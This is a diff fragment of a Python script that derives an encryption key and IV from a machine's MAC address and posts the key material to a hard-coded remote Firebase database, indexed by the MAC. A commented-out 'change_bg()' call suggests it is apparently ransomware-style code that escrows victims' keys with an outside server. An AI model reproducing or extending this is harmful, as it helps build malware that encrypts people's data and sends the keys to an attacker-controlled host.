@@ -60,16 +60,16 @@ password2 = str(mac)
 password = password2.encode()
 
 salt = os.urandom(SALT_SIZE)
+
 base = hashlib.pbkdf2_hmac('sha256', password, salt, 100000, dklen=IV_SIZE + KEY_SIZE)
 iv = base[0:IV_SIZE]
 key = base[IV_SIZE:]
+print(base)
+
+base2 = base.decode('latin-1')
 
 firebase = firebase.FirebaseApplication('https://keydata-e5fb1.firebaseio.com/', None)
-result = firebase.post('/user' + '/' + password2, {"Base" : str(base)})
-print(base)
-print(str(base))
-print(iv)
-print(key)
+result = firebase.post('/user' + '/' + password2, {"Base" : base2})
 
 #change_bg()
 
